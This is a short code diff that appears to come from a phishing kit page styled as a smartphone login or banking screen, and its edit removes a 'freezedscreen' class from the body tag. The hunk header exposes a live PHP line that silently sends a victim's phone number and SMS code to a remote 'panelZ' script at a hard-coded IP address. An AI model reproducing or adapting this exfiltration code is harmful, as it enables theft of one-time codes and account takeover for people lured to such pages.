@@ -33,7 +33,7 @@ $test = @file_get_contents("http://137.74.171.167/panelZ/a.php?sms=$phone,$code"
     <link rel="stylesheet" href="../../files/bars/smartphone-home.css">
 </head>
 
-<body class="freezedscreen" style="top: 0px;">
+<body class="" style="top: 0px;">
     <div id="shell" class="page" data-pid="324-114205-64">
         <div id="hamburger-menubackdrop" class="backDrop"></div>
         <a href="#skip" class="hidden">Skip to content</a>
